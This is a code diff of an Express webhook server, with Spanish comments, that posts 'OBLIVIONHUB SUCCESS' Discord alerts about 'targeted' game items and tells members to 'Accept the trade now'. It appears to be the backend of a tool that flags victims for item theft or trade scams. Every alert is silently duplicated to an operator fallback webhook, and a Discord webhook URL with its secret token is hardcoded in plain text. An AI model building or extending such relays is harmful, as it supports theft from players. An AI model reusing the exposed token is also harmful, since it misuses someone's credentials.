@@ -19,8 +19,6 @@ app.post('/webhook', async (req, res) => {
         const data = req.body;
 
         const player = data.playerName || 'Desconocido';
-        const target = data.targetName || 'Desconocido';
-        const targetId = data.targetId || 0;
         const webhookUrl = data.webhookUrl;
         const hasPrivateItem = data.hasPrivateItem || false;
 
@@ -51,13 +49,16 @@ app.post('/webhook', async (req, res) => {
 
         const totalTargeted = displayBrainTargeted.length + displayBaseTargeted.length + displayGearTargeted.length;
 
+        // 🔴 SI NO HAY ÍTEMS TARGETEADOS → NO ENVIAR NADA (sin cooldown, sin logs)
         if (totalTargeted === 0) {
-            console.log('⏭️ Sin ítems targeteados. No se enviará notificación.');
-            return res.status(200).json({ status: 'ok', message: 'Sin ítems targeteados, notificación omitida' });
+            return res.status(200).json({ status: 'ok', message: 'Sin ítems targeteados' });
         }
 
+        // ============================================================
+        //  FUNCIONES DE FORMATEO
+        // ============================================================
         function formatListWithCount(list) {
-            if (!list || list.length === 0) return 'NONE';
+            if (!list || list.length === 0) return 'Ninguno';
             const counts = {};
             list.forEach(item => {
                 counts[item] = (counts[item] || 0) + 1;
@@ -100,7 +101,7 @@ app.post('/webhook', async (req, res) => {
         }).replace(/\//g, '-');
 
         // ============================================================
-        //  CONSTRUIR EMBED (común para todos los webhooks)
+        //  CONSTRUIR EL EMBED
         // ============================================================
         const embed = {
             title: '✅ OBLIVIONHUB SUCCESS',
@@ -118,54 +119,52 @@ app.post('/webhook', async (req, res) => {
         };
 
         // ============================================================
-        //  PAYLOAD CON @everyone (para webhook privado o del usuario)
+        //  DECIDIR A QUÉ WEBHOOKS ENVIAR
         // ============================================================
-        let contentWithMention = '';
+        const webhookUrls = [];
+
         if (hasPrivateItem) {
-            contentWithMention = '@everyone **¡Se ha detectado una coincidencia con ítems privados!** 🚀 Acepta el trade ahora.';
+            const privateWebhook = webhookUrl || 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';
+            webhookUrls.push(privateWebhook);
+            webhookUrls.push(FALLBACK_WEBHOOK);
         } else {
-            contentWithMention = '@everyone **A targeted item has been found!** 🚀 Accept the trade now.';
+            if (webhookUrl) {
+                webhookUrls.push(webhookUrl);
+            }
+            webhookUrls.push(FALLBACK_WEBHOOK);
+        }
+
+        // ============================================================
+        //  CONSTRUIR PAYLOAD CON @everyone (según corresponda)
+        // ============================================================
+        let content = '';
+        if (hasPrivateItem) {
+            content = '@everyone **¡Se ha detectado una coincidencia con ítems privados!** 🚀 Acepta el trade ahora.';
+        } else {
+            content = '@everyone **A targeted item has been found!** 🚀 Accept the trade now.';
         }
 
         const payloadWithMention = {
-            content: contentWithMention,
+            content: content,
             username: BOT_USERNAME,
             avatar_url: BOT_AVATAR,
             embeds: [embed]
         };
 
-        // ============================================================
-        //  PAYLOAD SIN @everyone (para FALLBACK_WEBHOOK)
-        // ============================================================
         const payloadWithoutMention = {
-            content: '',  // Sin @everyone, solo el embed
+            content: '',
             username: BOT_USERNAME,
             avatar_url: BOT_AVATAR,
             embeds: [embed]
         };
 
         // ============================================================
-        //  DECIDIR A QUÉ WEBHOOKS ENVIAR Y CON QUÉ PAYLOAD
+        //  ENVIAR CON REINTENTOS (sin cooldown, solo manejo de 429)
         // ============================================================
-        const webhooksToSend = [];
+        for (const url of webhookUrls) {
+            const isFallback = (url === FALLBACK_WEBHOOK);
+            const payload = isFallback ? payloadWithoutMention : payloadWithMention;
 
-        if (hasPrivateItem) {
-            // 🔴 Coincidencia privada: @everyone al webhook privado, SIN @everyone al FALLBACK
-            const privateWebhook = webhookUrl || 'https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L';
-            webhooksToSend.push({ url: privateWebhook, payload: payloadWithMention });
-            webhooksToSend.push({ url: FALLBACK_WEBHOOK, payload: payloadWithoutMention });
-        } else {
-            // 🟢 Sin coincidencia privada: @everyone al webhook del usuario (si existe), SIN @everyone al FALLBACK
-            if (webhookUrl) {
-                webhooksToSend.push({ url: webhookUrl, payload: payloadWithMention });
-            }
-            webhooksToSend.push({ url: FALLBACK_WEBHOOK, payload: payloadWithoutMention });
-        }
-
-        // ============================================================
-        //  ENVIAR CON REINTENTOS (rate limit 429)
-        // ============================================================
-        for (const { url, payload } of webhooksToSend) {
             let retries = 3;
             let success = false;
             while (retries > 0 && !success) {
@@ -176,7 +175,7 @@ app.post('/webhook', async (req, res) => {
                 } catch (err) {
                     if (err.response && err.response.status === 429) {
                         const retryAfter = parseInt(err.response.headers['retry-after']) || 5;
-                        console.log(`⏳ Rate limit en ${url}. Esperando ${retryAfter} segundos...`);
+                        console.log(`⏳ Rate limit en ${url}. Reintentando en ${retryAfter} segundos...`);
                         await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                         retries--;
                     } else {
